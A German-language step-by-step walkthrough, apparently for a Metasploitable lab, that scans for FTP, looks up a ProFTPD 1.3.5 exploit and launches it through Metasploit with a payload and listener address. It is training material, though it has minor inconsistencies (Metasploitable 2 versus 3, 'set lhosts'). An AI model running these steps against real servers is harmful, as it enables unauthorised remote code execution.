# FTP

## Nmap-Scan

Als erstes sollte ein Nmap-Scan durchgeführt werden, um zu sehen, ob der Metasploitable 2 Server FTP hat:

``` bash
nmap -sV -sC <IP-Adresse>
```

![Bild01.jpg](/images/Metaspolitable-3/FTP/Bild01.jpg)

## Bash-Exploit-Suche

Um zu kontrollieren, ob es einen Exploit gibt, kann man den folgenden Befehl ausführen:

``` bash
searchsploit ProFTPD 1.3.5
```

![Bild02.jpg](/images/Metaspolitable-3/FTP/Bild02.jpg)

## Starten der Metasploit-Konsole

Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Dafür muss man zuerst die Metasploit-Konsole starten:

``` bash
msfconsole
```

![Bild03.jpg](/images/Metaspolitable-3/FTP/Bild03.jpg)

## Suche nach dem Exploit in der Metasploit-Konsole

Nachdem die Konsole gestartet wurde, muss man noch einmal nach dem Exploit suchen:

``` bash
search ProFTPD 1.3.5
```

![Bild04.jpg](/images/Metaspolitable-3/FTP/Bild04.jpg)

## Auswahl des Exploits

Um den Exploit auszuwählen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):

``` bash
use 0
```

![Bild05.jpg](/images/Metaspolitable-3/FTP/Bild05.jpg)

## Anzeigen von Optionen

Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:

``` bash
show options
```

![Bild06.jpg](/images/Metaspolitable-3/FTP/Bild06.jpg)

## Optionen setzen

Danach kann man mit dem folgenden Befehl die Option setzen:

``` bash
set RHOSTS <IP-Adresse>
```

![Bild07.jpg](/images/Metaspolitable-3/FTP/Bild07.jpg)

``` bash
set sitepath /var/html/www
```

![Bild08.jpg](/images/Metaspolitable-3/FTP/Bild08.jpg)

Alle Payloads anzeigen:

``` bash
show payloads
```

![Bild09.jpg](/images/Metaspolitable-3/FTP/Bild09.jpg)

``` bash
set payload 5
```

![Bild10.jpg](/images/Metaspolitable-3/FTP/Bild10.jpg)

``` bash
show options
```

![Bild11.jpg](/images/Metaspolitable-3/FTP/Bild11.jpg)

``` bash
set lhosts <IP-Adresse>
```

![Bild12.jpg](/images/Metaspolitable-3/FTP/Bild12.jpg)

## Starten des Exploits

Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:

``` bash
run
```

![Bild13.jpg](/images/Metaspolitable-3/FTP/Bild13.jpg)